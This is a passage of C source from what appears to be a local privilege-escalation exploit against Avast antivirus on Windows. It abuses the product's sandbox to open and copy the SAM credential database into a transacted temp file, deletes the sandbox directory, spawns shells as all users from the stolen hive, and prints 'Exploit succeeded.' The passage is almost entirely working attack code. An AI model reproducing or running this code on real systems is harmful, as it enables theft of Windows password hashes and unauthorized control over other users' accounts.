        if(fni->FileNameLength > sizeof(sam) - sizeof(wchar_t) && _wcsicmp(&fni->FileName[wcslen(fni->FileName) - 3],sam) == 0)
        {
            wcscat(fullsam, fni->FileName);
            break;
        }
    } while (1);
    

    UNICODE_STRING samfinal = { 0 };
    RtlInitUnicodeString(&samfinal, fullsam);
    OBJECT_ATTRIBUTES samobjattr = { 0 };
    InitializeObjectAttributes(&samobjattr, &samfinal, OBJ_CASE_INSENSITIVE, NULL, NULL);
    iostat = { 0 };
    HANDLE hsamfinal = NULL;
    res = NtCreateFile(&hsamfinal, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &samobjattr, &iostat, NULL, NULL, FILE_SHARE_READ|FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (res)
	{
		printf("failed to open the SAM database, error : 0x%0.8X\n", res);
		return 1;
	}
    LARGE_INTEGER li = { 0 };
    do {
        Sleep(100);
        GetFileSizeEx(hsamfinal, &li);
    } while (li.QuadPart == 0);
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wuid2 = (wchar_t*)wuid;
	wchar_t samtr[MAX_PATH] = { 0 };
	wsprintf(samtr, L"C:\\Windows\\Temp\\%ws", wuid2);
	HANDLE htransaction = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!htransaction || htransaction == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create transaction, error : %d\n", GetLastError());
		return 1;
	}

	HANDLE hsamhive = CreateFileTransacted(samtr, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, htransaction, NULL, NULL);
	if (!hsamhive || hsamhive == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create transacted file, error : %d\n", GetLastError());
		return 1;
	}
	DWORD rrbytes = 0;
	char* samdata = (char*)malloc(li.QuadPart);
	if (!ReadFile(hsamfinal, samdata, li.QuadPart, &rrbytes, NULL))
	{
		printf("Failed to read SAM database, error : %d\n", GetLastError());
		return 1;
	}
	if(!WriteFile(hsamhive,samdata,li.QuadPart,&rrbytes,NULL))
	{
		printf("Failed to copy SAM database, error : %d\n", GetLastError());
		return 1;
	}
	CloseHandle(hsamfinal);
	CloseHandle(haswdir);
	TerminateProcess(pi.hProcess, ERROR_SUCCESS);
	CloseHandle(hsbx);
	CloseHandle(hsnx);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
    
    RRemoveDirectory(L"C:\\avast! sandbox");

	DoSpawnShellAsAllUsers(hsamhive);
	RollbackTransaction(htransaction);
	CloseHandle(htransaction);
	CloseHandle(hsamhive);

	ConnectNamedPipe(hpipe, NULL);
	CloseHandle(hpipe);

    printf("Exploit succeeded.\n");



 
    return 0;
}

